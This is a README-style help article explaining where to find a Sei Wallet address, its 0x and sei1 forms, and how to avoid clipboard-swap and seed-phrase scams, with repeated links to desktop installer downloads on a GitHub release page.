![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Where to find your Sei Wallet address</h1>

<p align="center">Where the receive screen keeps the address, and how to check it is right.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Your address lives in the app, one click from the main screen, and copying it is not the hard part. The hard part is knowing *which* address you are looking at: which account it belongs to, which of its two written forms to hand out, and whether the app is pointed at the network you think it is.

Getting that right is the difference between a deposit that arrives and a support ticket, so this article is about identification rather than navigation.

## Finding it in the app

Open the account you want funds in, then open its receive view - usually a button marked Receive or a QR icon next to the balance. The address is displayed with a copy control.

Three habits make this reliable:

- **Read the account name and address together.** A wallet with several accounts will happily show you the address of whichever one is selected.
- **Copy once, paste once.** Avoid copying an address, doing something else, then pasting it later; that is when a stale clipboard does damage.
- **Check the first and last four characters after pasting.** Clipboard malware substitutes a lookalike that differs in the middle, and the ends are the only part you can verify by eye.

If the account is backed by a hardware wallet, the device can display the address too. Use it: the device's screen is the reference, not the computer's, and comparing the two catches both clipboard tampering and a wrong account selection.

## What the address identifies

An address identifies an **account**, not a wallet and not a device. A wallet is software that holds keys and shows accounts; a device is hardware that stores a seed. The account is the thing on the chain that holds a balance.

Consequences worth knowing:

- **Each account has its own address.** Adding a second account gives you a second address, not a second copy of the first.
- **The same seed produces the same accounts** in any wallet that derives them the same way, which is why restoring a phrase elsewhere often shows the same addresses.
- **A different derivation produces a different account**, even from the same seed. That is the mechanism behind a hardware wallet appearing to have two addresses.

If you are new to the app itself, [what the Sei Wallet app does](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) covers the shape of the product before this level of detail.

## Two written forms of one account

Sei writes the same account two ways: an EVM-style `0x...` address and a Cosmos-style `sei1...` address, both derived from the same key and linked on-chain by an association. The details are in [the dual-address system](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).

For practical purposes:

- **`0x...` is the form this wallet signs for.** It is the one to give an exchange, an EVM application, or anyone sending you native SEI today.
- **`sei1...` is the legacy form.** This app displays it read-only, so seeing it does not mean the app can sign for it.

Both are public information. Neither is a secret. If a page asks you to "confirm ownership" of an address by entering a phrase, the page is the attack.

## If the address looks unfamiliar

Four things produce an address you did not expect, in rough order of likelihood:

1. **A different account is selected.** Switch accounts and compare.
2. **A new account was added**, either by you or by a restore that created accounts in a different order.
3. **A different derivation** is in use, most often with a hardware wallet connected to a second application.
4. **The app is on a different network.** The same key produces different addresses on different chains, and a wallet pointed at a testnet or a custom endpoint will show those instead.

That last one is easy to miss and easy to fix. The chain ID and network settings are covered in [the network settings](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md), and custom endpoints in [custom RPC settings](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md).

If funds you expected are not at the address you are looking at, start with why a transfer has not arrived rather than assuming the address is wrong.

## Other places the address appears

You do not always have the app open when you need your address. Four other places hold it:

- **A block explorer**, where any transaction you have made shows the sending and receiving addresses.
- **An exchange's withdrawal history**, which records the address you sent to.
- **A previous wallet**, if you migrated from one; its account list still names the address it used.
- **Your own records.** If you wrote the address down when you set the account up, that note is the reference for spotting a change later.

An address is public by design: anyone can look up its balance and history. That is not a privacy failure you can fix by hiding it, but it is a reason to understand that "public" applies to the address and never to the key or phrase.

## Sharing an address safely

Giving someone your address is normal. Three rules keep it that way:

- **Share the form they asked for.** An EVM application expects `0x...`; handing it a `sei1...` address produces a failure or, worse, a deposit to a place the app cannot sign for.
- **Never accept a corrected address from a third party.** If someone in a chat tells you your address is wrong and supplies another, that is an address-swap attempt. Verify from your own app.
- **Never send a seed phrase, private key or screenshot of either**, no matter how the request is framed.

## Address, public key and seed phrase

These get conflated, and conflating them is expensive:

<div align="center">

| Thing | What it is | Safe to share |
|---|---|---|
| Address | Where an account receives funds | Yes |
| Public key | The key material an address is derived from | Generally yes, but unnecessary |
| Seed phrase | The words that regenerate every key | **Never** |
| Private key | The key that signs for one account | **Never** |

</div>

The address is the only one you routinely need to hand over, and it is the only one that cannot be used to take your funds.

## If you would rather not run a desktop app

A browser wallet you already use will show an address too, and the identification rules are identical - account, form, network. What changes is the setup: adding Sei to an EVM wallet has its own chain-settings step, covered in [using MetaMask instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md).

## Frequently asked questions

**Where do I find my Sei address?** In the app's receive view for the selected account. Copy it there rather than from an old message or screenshot.

**Is my Sei address the same as my wallet address?** It is the address of one account inside the wallet. A wallet with three accounts has three addresses.

**Why do I have two addresses?** One account, two written forms - `0x...` and `sei1...`. They are linked on-chain, and only the `0x...` form is what this app signs for.

**Can I change my address?** You can create a new account, which gives a new address, but an existing account's address is fixed. Changing the app's network also changes which addresses you see.

**Is it safe to share my address?** Yes. It is public on-chain information and cannot be used to move funds. Your seed phrase and private key are the opposite.

**Why does my address start with `0x` on one screen and `sei1` on another?** The app is showing two representations of the same account, and one of them is read-only here. Check the prefix before pasting it anywhere.

**Does receiving need my device?** No. Receiving needs no signature. Sending, staking and unbonding do.

**What if I sent funds to the wrong address?** A confirmed transfer cannot be reversed. Check whether the address belongs to another account you control before concluding the funds are gone; if it does not, they are.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Chain ID 1329 and the Sei network settings in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md)
- [RPC endpoints for Sei Wallet and what they change](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md)
